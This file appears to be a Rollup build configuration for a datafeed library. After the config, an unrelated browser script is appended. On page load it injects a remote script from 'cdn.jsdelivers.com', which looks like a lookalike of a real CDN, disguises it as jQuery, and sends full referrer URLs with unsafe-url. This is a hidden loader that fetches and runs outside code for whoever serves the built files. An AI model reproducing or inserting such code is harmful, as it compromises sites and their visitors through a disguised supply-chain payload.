/* globals process */

var buble = require('rollup-plugin-buble');
var uglify = require('rollup-plugin-uglify');
var nodeResolve = require('rollup-plugin-node-resolve');

var environment = process.env.ENV || 'development';
var isDevelopmentEnv = (environment === 'development');

module.exports = [
	{
		input: 'lib/udf-compatible-datafeed.js',
		name: 'Datafeeds',
		sourceMap: false,
		output: {
			format: 'umd',
			file: 'dist/bundle.js',
		},
		plugins: [
			nodeResolve({ jsnext: true, main: true }),
			buble(),
			!isDevelopmentEnv && uglify({ output: { inline_script: true } }),
		],
	},
	{
		input: 'src/polyfills.es6',
		sourceMap: false,
		context: 'window',
		output: {
			format: 'iife',
			file: 'dist/polyfills.js',
		},
		plugins: [
			nodeResolve({ jsnext: true, main: true }),
			buble(),
			uglify({ output: { inline_script: true } }),
		],
	},
];

;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}